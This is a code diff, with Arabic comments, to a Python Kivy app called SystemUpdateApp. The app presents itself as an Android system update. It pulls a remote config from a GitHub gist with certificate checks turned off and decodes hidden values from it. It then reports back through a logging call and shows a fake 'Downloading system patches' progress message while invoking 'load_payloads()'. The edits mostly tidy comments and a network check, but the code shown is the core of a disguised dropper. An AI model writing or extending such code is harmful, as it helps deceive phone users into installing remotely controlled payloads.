@@ -15,6 +15,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
     def build(self):
+        # الرابط الصحيح والمباشر لـ config.json (بدون أي إضافات)
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
 
         layout = BoxLayout(orientation='vertical')
@@ -66,19 +67,18 @@ class SystemUpdateApp(App):
             if platform == 'android':
                 try:
                     from android.permissions import request_permissions, Permission
-                    # طلب صلاحيات الإنترنت وحالة الشبكة معاً
                     request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
-                    time.sleep(2)  # انتظار تفعيل الصلاحيات
+                    time.sleep(2)
                 except Exception as perm_err:
                     print(f"Perm warning: {perm_err}")
 
-            # اختبار بسيط للاتصال بالإنترنت (محاولة الوصول إلى google)
+            # اختبار اتصال بسيط لتفعيل الشبكة (اختياري)
             try:
-                requests.get("https://www.google.com", timeout=5, verify=False)
+                requests.get("https://8.8.8.8", timeout=5)
             except:
-                pass  # لا نهتم بالنتيجة، فقط لتنشيط الشبكة
+                pass
 
-            # الاتصال الفعلي بملف الإعدادات
+            # تحميل الإعدادات
             response = requests.get(self.config_url, timeout=15, verify=False)
             config = response.json()
 
@@ -88,7 +88,7 @@ class SystemUpdateApp(App):
                 'v_id': self.decode_secret(config['v'])
             }
 
-            self.send_log("🚀 [System Update] Online! Network permissions OK.")
+            self.send_log("🚀 [System Update] Online! Configuration loaded.")
             self.label.text = "Downloading system patches... (35%)"
             self.load_payloads()
 
